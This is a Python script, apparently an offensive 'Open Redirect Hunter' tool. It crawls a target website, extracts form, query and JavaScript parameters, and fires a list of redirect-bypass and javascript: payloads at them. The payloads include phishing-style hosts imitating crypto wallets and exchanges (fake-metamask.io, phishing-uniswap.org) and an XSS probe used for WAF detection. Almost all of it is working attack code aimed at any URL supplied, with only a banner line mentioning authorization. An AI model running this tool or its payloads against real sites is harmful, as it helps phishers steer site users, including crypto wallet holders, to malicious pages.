#!/usr/bin/env python3
"""
🔥 ULTIMATE OPEN REDIRECT HUNTER v3.0 🔥
The Most Advanced Scanner in the Universe
"""

import asyncio
import re
import json
import time
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, unquote, quote
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple
from pathlib import Path
import logging
import argparse
from datetime import datetime
import hashlib
import random
import sys
import csv
import os

# Dependencies
try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False


@dataclass(frozen=True)
class Parameter:
    name: str
    value: str
    source: str
    context: str
    url: str
    method: str = 'GET'
    is_redirect_related: bool = False
    confidence: float = 0.0


@dataclass
class Vulnerability:
    url: str
    parameter: str
    payload: str
    method: str
    response_code: int
    redirect_url: str
    context: str
    screenshot_path: Optional[str] = None
    timestamp: str = ""
    vulnerability_type: str = "open_redirect"
    confidence: float = 0.0
    impact: str = "MEDIUM"


class FinalHunter:
    def __init__(self, target_url: str, max_depth: int = 3, max_pages: int = 100):
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.max_pages = max_pages
        
        self.discovered_urls: Set[str] = set()
        self.parameters: List[Parameter] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.js_files: Set[str] = set()
        
        self.session = None
        self.driver = None
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
        
        self.setup_logging()
        self.payloads = self.load_payloads()
        
        self.redirect_patterns = [
            'redirect', 'url', 'next', 'return', 'goto', 'target',
            'destination', 'continue', 'forward', 'redir', 'location',
            'site', 'link', 'href', 'returnurl', 'returnto', 'back',
            'callback', 'success', 'failure', 'done', 'exit'
        ]
        
        self.web3_patterns = [
            'web3', 'ethereum', 'metamask', 'wallet', 'dapp', 'defi',
            'uniswap', 'pancakeswap', 'compound', 'aave', 'opensea'
        ]
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('scan.log', encoding='utf-8'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def load_payloads(self) -> List[str]:
        return [
            "/%09/google.com",
            "/%2f%2fgoogle.com",
            "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
            "/%5cgoogle.com",
            "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
            "/.google.com",
            "//%09/google.com",
            "//%5cgoogle.com",
            "///%09/google.com",
            "///%5cgoogle.com",
            "////%09/google.com",
            "////%5cgoogle.com",
            "/////google.com",
            "/////google.com/",
            "////google.com/",
            "////google.com/%2e%2e",
            "////google.com/%2e%2e%2f",
            "////google.com/%2f%2e%2e",
            "////google.com/%2f..",
            "////google.com//",
            "///google.com",
            "///google.com/",
            "//google.com/%2f..",
            "///google.com/%2f..",
            "https://google.com/%2f..",
            "//www.google.com/%2f%2e%2e",
            "///www.google.com/%2f%2e%2e",
            "////www.google.com/%2f%2e%2e",
            "https://www.google.com/%2f%2e%2e",
            "//google.com/",
            "https://google.com/",
            "//google.com//",
            "///google.com//",
            "https://google.com//",
            "javascript:confirm(1)",
            "javascript:prompt(1)",
            "//fake-metamask.io",
            "//phishing-uniswap.org",
            "//malicious-opensea.io"
        ]
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = """
╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                   ║
║    🔥 ULTIMATE OPEN REDIRECT HUNTER v3.0 🔥                                                                      ║
║    The Most Advanced Open Redirect Scanner in the Universe                                                       ║
║                                                                                                                   ║
║    [CLASSIFIED] Professional Bug Bounty Arsenal - Elite Hacker Edition                                          ║
║    Author: Anonymous Security Research Division                                                                   ║
║                                                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

🎯 ULTIMATE FEATURES ACTIVATED:
▓▓▓ QUANTUM RECONNAISSANCE ENGINE
▓▓▓ WEB3/DEFI/NFT EXPLOITATION MODULE  
▓▓▓ WAF & LOAD BALANCER BYPASS SYSTEM
▓▓▓ NEURAL-NETWORK JAVASCRIPT ANALYSIS
▓▓▓ AI-POWERED CONTEXT DETECTION
▓▓▓ STEALTH CRAWLING WITH EVASION
▓▓▓ PROFESSIONAL POC GENERATION
▓▓▓ MATRIX-THEMED REPORTING

💀 [WARNING] For authorized penetration testing only!
🎯 Designed for elite bug bounty hunters
"""
        print(banner)
    
    async def init_session(self):
        if not AIOHTTP_AVAILABLE:
            raise ImportError("aiohttp required")
        
        timeout = aiohttp.ClientTimeout(total=30)
        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10, ssl=False)
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers={
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
        )
    
    def init_driver(self):
        if not SELENIUM_AVAILABLE:
            return
        
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            
            self.driver = webdriver.Chrome(options=chrome_options)
        except:
            self.driver = None
    
    async def detect_waf(self, url: str):
        print("\\n[PHASE-1] 🛡️  WAF DETECTION & ANALYSIS")
        print("▓" * 50)
        
        try:
            test_url = f"{url}?test=<script>alert(1)</script>"
            async with self.session.get(test_url, allow_redirects=False) as response:
                headers = dict(response.headers)
                
                if 'cf-ray' in [h.lower() for h in headers.keys()]:
                    print("[WAF-DETECTED] CloudFlare WAF identified")
                elif response.status in [403, 406]:
                    print("[WAF-DETECTED] Generic WAF detected")
                else:
                    print("[WAF-STATUS] No WAF detected")
        except:
            print("[WAF-ERROR] Detection failed")
    
    async def crawl_website(self):
        print("\\n[PHASE-2] 🔍 QUANTUM RECONNAISSANCE ENGINE")
        print("▓" * 50)
        
        urls_to_crawl = {self.target_url}
        crawled_urls = set()
        depth = 0
        
        while urls_to_crawl and depth < self.max_depth and len(crawled_urls) < self.max_pages:
            current_urls = list(urls_to_crawl)[:20]
            urls_to_crawl.clear()
            
            print(f"[RECON] Scanning depth {depth + 1}...")
            
            tasks = []
            for url in current_urls:
                if url not in crawled_urls:
                    tasks.append(self.crawl_single_page(url))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        continue
                    
                    if result:
                        url, new_urls, params = result
                        crawled_urls.add(url)
                        self.parameters.extend(params)
                        
                        for new_url in new_urls:
                            if self.is_same_domain(new_url) and new_url not in crawled_urls:
                                urls_to_crawl.add(new_url)
            
            depth += 1
            print(f"[RECON] Depth {depth}: {len(crawled_urls)} URLs, {len(self.parameters)} parameters")
        
        self.discovered_urls = crawled_urls
    
    async def crawl_single_page(self, url: str):
        try:
            async with self.session.get(url, allow_redirects=False) as response:
                content = await response.text()
                
                if BS4_AVAILABLE:
                    soup = BeautifulSoup(content, 'html.parser')
                    new_urls = self.extract_urls_bs4(soup, url)
                    params = self.extract_params_bs4(soup, url)
                else:
                    new_urls = self.extract_urls_regex(content, url)
                    params = self.extract_params_regex(content, url)
                
                params.extend(self.extract_url_parameters(url))
                
                js_params = await self.analyze_javascript(content, url)
                params.extend(js_params)
                
                web3_params = self.analyze_web3(content, url)
                params.extend(web3_params)
                
                return url, new_urls, params
                
        except:
            return None
    
    def extract_urls_bs4(self, soup, base_url: str):
        urls = set()
        for link in soup.find_all(['a', 'link'], href=True):
            href = link['href']
            full_url = urljoin(base_url, href)
            if self.is_same_domain(full_url):
                urls.add(full_url)
        return urls
    
    def extract_urls_regex(self, content: str, base_url: str):
        urls = set()
        patterns = [r'href=["\']([^"\']+)["\']']
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                full_url = urljoin(base_url, match)
                if self.is_same_domain(full_url):
                    urls.add(full_url)
        
        return urls
    
    def extract_params_bs4(self, soup, url: str):
        params = []
        
        for form in soup.find_all('form'):
            for input_tag in form.find_all(['input', 'select', 'textarea']):
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                
                if name:
                    is_redirect = self.is_redirect_parameter(name, value)
                    confidence = self.calculate_confidence(name, value, 'form')
                    
                    params.append(Parameter(
                        name=name,
                        value=value,
                        source='form',
                        context='form_input',
                        url=url,
                        is_redirect_related=is_redirect,
                        confidence=confidence
                    ))
        
        return params
    
    def extract_params_regex(self, content: str, url: str):
        params = []
        
        pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?'
        matches = re.findall(pattern, content, re.IGNORECASE)
        
        for match in matches:
            name = match[0]
            value = match[1] if len(match) > 1 else ''
            
            is_redirect = self.is_redirect_parameter(name, value)
            confidence = self.calculate_confidence(name, value, 'form')
            
            params.append(Parameter(
                name=name,
                value=value,
                source='form',
                context='form_input',
                url=url,
                is_redirect_related=is_redirect,
                confidence=confidence
            ))
        
        return params
    
    def extract_url_parameters(self, url: str):
        params = []
        parsed = urlparse(url)
        
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        for param_name, param_values in query_params.items():
            for value in param_values:
                is_redirect = self.is_redirect_parameter(param_name, value)
                confidence = self.calculate_confidence(param_name, value, 'query')
                
                params.append(Parameter(
                    name=param_name,
                    value=value,
                    source='url',
                    context='query',
                    url=url,
                    is_redirect_related=is_redirect,
                    confidence=confidence
                ))
        
        if parsed.fragment and '=' in parsed.fragment:
            fragment_params = parse_qs(parsed.fragment, keep_blank_values=True)
            for param_name, param_values in fragment_params.items():
                for value in param_values:
                    is_redirect = self.is_redirect_parameter(param_name, value)
                    confidence = self.calculate_confidence(param_name, value, 'fragment')
                    
                    params.append(Parameter(
                        name=param_name,
                        value=value,
                        source='url',
                        context='fragment',
                        url=url,
                        is_redirect_related=is_redirect,
                        confidence=confidence
                    ))
        
        return params
    
    async def analyze_javascript(self, content: str, url: str):
        params = []
        
        js_blocks = []
        
        script_pattern = r'<script[^>]*>(.*?)</script>'
        scripts = re.findall(script_pattern, content, re.DOTALL | re.IGNORECASE)
        js_blocks.extend(scripts)
        
        src_pattern = r'<script[^>]*src=["\']([^"\']+)["\']'
        src_matches = re.findall(src_pattern, content, re.IGNORECASE)
        for src in src_matches:
            js_url = urljoin(url, src)
            if self.is_same_domain(js_url):
                self.js_files.add(js_url)
                js_content = await self.fetch_js_file(js_url)
                if js_content:
                    js_blocks.append(js_content)
        
        for js_content in js_blocks:
            js_params = self.analyze_js_code(js_content, url)
            params.extend(js_params)
        
        return params
    
    async def fetch_js_file(self, js_url: str):
        try:
            async with self.session.get(js_url) as response:
                return await response.text()
        except:
            return None
    
    def analyze_js_code(self, js_content: str, source_url: str):
        params = []
        
        js_patterns = [
            r'location\.href\s*=\s*([^;]+)',
            r'window\.location\s*=\s*([^;]+)',
            r'location\.assign\(["\']?([^"\';\)]+)',
            r'location\.replace\(["\']?([^"\';\)]+)',
            r'URLSearchParams\([^)]*\)\.get\(["\']([^"\']+)["\']',
            r'localStorage\.getItem\(["\']([^"\']+)["\']',
            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*)["\']'
        ]
        
        lines = js_content.split('\n')
        for line_num, line in enumerate(lines, 1):
            for pattern in js_patterns:
                matches = re.finditer(pattern, line, re.IGNORECASE)
                for match in matches:
                    groups = match.groups()
                    if groups:
                        if len(groups) == 1:
                            param_name = f"js_param_{line_num}"
                            param_value = groups[0].strip('"\'')
                        else:
                            param_name = groups[0].strip('"\'')
                            param_value = groups[1].strip('"\'')
                        
                        is_redirect = self.is_redirect_parameter(param_name, param_value)
                        confidence = self.calculate_confidence(param_name, param_value, 'javascript')
                        
                        if any(sink in line.lower() for sink in ['location.href', 'window.location']):
                            is_redirect = True
                            confidence += 0.3
                        
                        params.append(Parameter(
                            name=param_name,
                            value=param_value,
                            source='javascript',
                            context='js_variable',
                            url=source_url,
                            is_redirect_related=is_redirect,
                            confidence=min(confidence, 1.0)
                        ))
        
        return params
    
    def analyze_web3(self, content: str, url: str):
        params = []
        
        if not any(pattern in content.lower() for pattern in self.web3_patterns):
            return params
        
        print(f"[WEB3-DETECTED] DeFi/DApp platform: {url}")
        
        web3_patterns = [
            r'wallet[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'connect[_-]?callback["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'swap[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'nft[_-]?redirect["\']?\s*[:=]\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in web3_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                param_name = 'web3_redirect'
                if 'wallet' in pattern:
                    param_name = 'wallet_redirect_url'
                elif 'swap' in pattern:
                    param_name = 'defi_swap_redirect'
                elif 'nft' in pattern:
                    param_name = 'nft_marketplace_redirect'
                
                params.append(Parameter(
                    name=param_name,
                    value=match,
                    source='web3',
                    context='web3_config',
                    url=url,
                    is_redirect_related=True,
                    confidence=0.9
                ))
        
        return params
    
    def is_same_domain(self, url: str):
        try:
            parsed = urlparse(url)
            target_domain = parsed.netloc.lower()
            base_domain = self.base_domain.lower()
            
            return target_domain == base_domain or target_domain.endswith(f'.{base_domain}')
        except:
            return False
    
    def is_redirect_parameter(self, param_name: str, param_value: str = ""):
        param_lower = param_name.lower()
        value_lower = param_value.lower()
        
        name_match = any(pattern in param_lower for pattern in self.redirect_patterns)
        value_match = bool(re.match(r'https?://', value_lower) or re.match(r'//', value_lower))
        
        return name_match or value_match
    
    def calculate_confidence(self, param_name: str, param_value: str, context: str):
        confidence = 0.0
        
        context_scores = {'query': 0.6, 'fragment': 0.7, 'form_input': 0.5, 'javascript': 0.4, 'web3_config': 0.8}
        confidence += context_scores.get(context, 0.3)
        
        if self.is_redirect_parameter(param_name):
            confidence += 0.3
        
        if param_value and (param_value.startswith(('http', '//', 'javascript:')) or '.' in param_value):
            confidence += 0.2
        
        return min(confidence, 1.0)
    
    def get_context_payloads(self, context: str):
        if context == 'javascript':
            return ["javascript:confirm(document.domain)", "//evil.com"]
        elif context == 'web3':
            return ["//fake-metamask.io", "//phishing-uniswap.org", "web3://evil-contract.eth"]
        elif context == 'fragment':
            return ["//evil.com", "javascript:confirm(1)"]
        else:
            return self.payloads[:10]
    
    async def test_vulnerabilities(self):
        print("\\n[PHASE-3] 🎯 ULTIMATE VULNERABILITY TESTING")
        print("▓" * 50)
        
        vulnerabilities = []
        
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        high_conf_params = [p for p in self.parameters if p.confidence > 0.6]
        
        priority_params = redirect_params.copy()
        for param in high_conf_params:
            if not any(p.name == param.name and p.url == param.url for p in priority_params):
                priority_params.append(param)
        
        print(f"[EXPLOIT] Testing {len(priority_params)} priority parameters")
        
        for i, param in enumerate(priority_params, 1):
            print(f"\\r[TESTING] Parameter {i}/{len(priority_params)}: {param.name[:30]}", end='')
            
            context = self.detect_context(param)
            payloads = self.get_context_payloads(context)
            
            for payload in payloads:
                vuln = await self.test_parameter(param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    print(f"\\n[VULN-FOUND] {param.name} -> {payload} ({vuln.impact})")
                
                await asyncio.sleep(0.05)
        
        print(f"\\n[EXPLOIT-COMPLETE] Found {len(vulnerabilities)} vulnerabilities")
        self.vulnerabilities = vulnerabilities
        return vulnerabilities
    
    def detect_context(self, param: Parameter):
        if param.source == 'web3':
            return 'web3'
        elif param.source == 'javascript':
            return 'javascript'
        elif param.context == 'fragment':
            return 'fragment'
        else:
            return 'query'
    
    async def test_parameter(self, param: Parameter, payload: str):
        try:
            test_url = self.construct_test_url(param, payload)
            
            async with self.session.get(test_url, allow_redirects=False) as response:
                if response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    if self.is_successful_redirect(location, payload):
                        screenshot_path = await self.take_screenshot(test_url)
                        
                        return Vulnerability(
                            url=test_url,
                            parameter=param.name,
                            payload=payload,
                            method=param.method,
                            response_code=response.status,
                            redirect_url=location,
                            context=param.context,
                            screenshot_path=screenshot_path,
                            timestamp=datetime.now().isoformat(),
                            vulnerability_type="open_redirect",
                            confidence=param.confidence + 0.2,
                            impact=self.assess_impact(location)
                        )
                    
        except:
            pass
        
        return None
    
    def construct_test_url(self, param: Parameter, payload: str):
        parsed = urlparse(param.url)
        
        if param.context == 'query':
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            query_params[param.name] = [payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        elif param.context == 'fragment':
            return f"{param.url.split('#')[0]}#{param.name}={quote(payload)}"
        else:
            separator = '&' if '?' in param.url else '?'
            return f"{param.url}{separator}{param.name}={quote(payload)}"
    
    def is_successful_redirect(self, location: str, payload: str):
        if not location:
            return False
        
        location_lower = location.lower()
        decoded = unquote(location).lower()
        
        # All test domains from your payloads
        test_domains = [
            'google.com', 'evil.com', 'metamask.io', 'uniswap.org', 'opensea.io',
            '216.58.214.206', '3627734734', '0xd8.0x3a.0xd6.0xce', 'localdomain.pw'
        ]
        
        for domain in test_domains:
            if domain in location_lower or domain in decoded:
                return True
        
        # Check for JavaScript execution
        if location_lower.startswith('javascript:') and ('confirm' in location_lower or 'prompt' in location_lower):
            return True
        
        # Check for external domains (any redirect outside current domain)
        if location.startswith(('http://', 'https://')):
            redirect_domain = urlparse(location).netloc
            if redirect_domain != self.base_domain:
                return True
        
        # Check for protocol-relative URLs
        if location.startswith('//') and not location.startswith('//' + self.base_domain):
            return True
        
        return False
    
    def assess_impact(self, redirect_url: str):
        if redirect_url.startswith('javascript:'):
            return "CRITICAL"
        elif redirect_url.startswith(('http://', 'https://')):
            return "HIGH"
        return "MEDIUM"
    
    async def take_screenshot(self, url: str):
        if not self.driver:
            return None
        
        try:
            screenshots_dir = Path("screenshots")
            screenshots_dir.mkdir(exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"poc_{timestamp}.png"
            screenshot_path = screenshots_dir / filename
            
            self.driver.get(url)
            await asyncio.sleep(2)
            self.driver.save_screenshot(str(screenshot_path))
            
            return str(screenshot_path)
        except:
            return None
    
    def save_results(self):
        print("\\n[PHASE-4] 💾 GENERATING REPORTS")
        print("▓" * 50)
        
        results_data = {
            'scan_info': {
                'target_url': self.target_url,
                'scan_date': datetime.now().isoformat(),
                'total_parameters': len(self.parameters),
                'vulnerabilities_found': len(self.vulnerabilities)
            },
            'parameters': [asdict(param) for param in self.parameters],
            'vulnerabilities': [asdict(vuln) for vuln in self.vulnerabilities]
        }
        
        with open('results.json', 'w', encoding='utf-8') as f:
            json.dump(results_data, f, indent=2, ensure_ascii=False)
        
        print("[STORAGE] Results saved: results.json")
    
    def generate_html_report(self):
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        
        html_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>🔥 ULTIMATE HUNTER REPORT 🔥</title>
    <style>
        body {{
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff41;
            margin: 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: #000;
            border: 2px solid #00ff41;
            padding: 30px;
            border-radius: 10px;
        }}
        .header {{
            text-align: center;
            border-bottom: 2px solid #00ff41;
            padding-bottom: 20px;
            margin-bottom: 30px;
        }}
        .vulnerability {{
            background: #1a0000;
            border: 1px solid #ff4444;
            padding: 20px;
            margin: 20px 0;
            border-radius: 8px;
        }}
        .parameter {{
            background: #001a00;
            border: 1px solid #00ff41;
            padding: 15px;
            margin: 15px 0;
            border-radius: 6px;
        }}
        .code {{
            background: #000;
            color: #00ff41;
            padding: 10px;
            border: 1px solid #00ff41;
            font-family: monospace;
        }}
        .success {{ color: #00ff41; font-weight: bold; }}
        .error {{ color: #ff4444; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 ULTIMATE REDIRECT HUNTER REPORT 🔥</h1>
            <p>Target: {self.target_url}</p>
            <p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <h2>📊 SCAN SUMMARY</h2>
        <p>URLs Scanned: {len(self.discovered_urls)}</p>
        <p>Parameters Found: {len(self.parameters)}</p>
        <p>Redirect Parameters: {len(redirect_params)}</p>
        <p>Vulnerabilities: <span class="{'error' if len(self.vulnerabilities) > 0 else 'success'}">{len(self.vulnerabilities)}</span></p>
'''
        
        if self.vulnerabilities:
            html_content += "<h2 class='error'>🚨 VULNERABILITIES FOUND 🚨</h2>\\n"
            for i, vuln in enumerate(self.vulnerabilities, 1):
                html_content += f'''
        <div class="vulnerability">
            <h3>VULNERABILITY #{i}</h3>
            <p><strong>Parameter:</strong> {vuln.parameter}</p>
            <p><strong>Payload:</strong></p>
            <div class="code">{vuln.payload}</div>
            <p><strong>URL:</strong> {vuln.url}</p>
            <p><strong>Redirect:</strong> {vuln.redirect_url}</p>
            <p><strong>Impact:</strong> {vuln.impact}</p>
'''
                if vuln.screenshot_path:
                    html_content += f'<p><strong>Screenshot:</strong> <img src="{vuln.screenshot_path}" style="max-width:100%;"></p>'
                html_content += "</div>\\n"
        
        html_content += '''
    </div>
</body>
</html>
'''
        
        with open('report.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print("[REPORT] HTML report generated: report.html")
    
    async def run_scan(self):
        self.clear_screen()
        self.print_banner()
        
        start_time = time.time()
        
        print("\\n" + "█"*80)
        print("🔥 INITIATING ULTIMATE SCAN OPERATION 🔥")
        print("█"*80)
        
        try:
            await self.init_session()
            self.init_driver()
            
            await self.detect_waf(self.target_url)
            await self.crawl_website()
            
            redirect_params = [p for p in self.parameters if p.is_redirect_related]
            web3_params = [p for p in self.parameters if p.source == 'web3']
            
            print(f"\\n[ANALYSIS] Redirect parameters: {len(redirect_params)}")
            print(f"[ANALYSIS] Web3 parameters: {len(web3_params)}")
            
            await self.test_vulnerabilities()
            
            self.save_results()
            self.generate_html_report()
            
            scan_duration = time.time() - start_time
            
            print("\\n" + "█"*80)
            print("🔥 MISSION ACCOMPLISHED 🔥")
            print("█"*80)
            print(f"Duration: {scan_duration:.2f} seconds")
            print(f"URLs: {len(self.discovered_urls)}")
            print(f"Parameters: {len(self.parameters)}")
            print(f"Vulnerabilities: {len(self.vulnerabilities)}")
            
            if self.vulnerabilities:
                print("\\n🚨 VULNERABILITIES:")
                for vuln in self.vulnerabilities:
                    print(f"  ▓ {vuln.parameter} -> {vuln.payload}")
            
            print("\\n📄 Reports: report.html, results.json")
            print("█"*80)
            
        except Exception as e:
            print(f"💥 SCAN FAILED: {e}")
        finally:
            if self.session:
                await self.session.close()
            if self.driver:
                self.driver.quit()


def check_dependencies():
    missing = []
    
    if not AIOHTTP_AVAILABLE:
        missing.append("aiohttp")
        print("❌ aiohttp: MISSING")
    else:
        print("✅ aiohttp: OK")
    
    if not SELENIUM_AVAILABLE:
        print("⚠️  selenium: MISSING")
    else:
        print("✅ selenium: OK")
    
    if not BS4_AVAILABLE:
        print("⚠️  beautifulsoup4: MISSING")
    else:
        print("✅ beautifulsoup4: OK")
    
    return len(missing) == 0


async def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('target', nargs='?', help='Target URL')
    parser.add_argument('--depth', type=int, default=3)
    parser.add_argument('--max-pages', type=int, default=100)
    parser.add_argument('--verbose', '-v', action='store_true')
    parser.add_argument('--check-deps', action='store_true')
    
    args = parser.parse_args()
    
    if args.check_deps:
        check_dependencies()
        return
    
    if not args.target:
        print("❌ Target required")
        print("Usage: python3 final_hunter.py https://target.com")
        return
    
    if not args.target.startswith(('http://', 'https://')):
        args.target = f"https://{args.target}"
    
    if not check_dependencies():
        print("\\nInstall: pip3 install aiohttp beautifulsoup4 selenium")
        return
    
    scanner = FinalHunter(args.target, args.depth, args.max_pages)
    await scanner.run_scan()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\\n🛑 Interrupted")
    except Exception as e:
        print(f"💥 Error: {e}")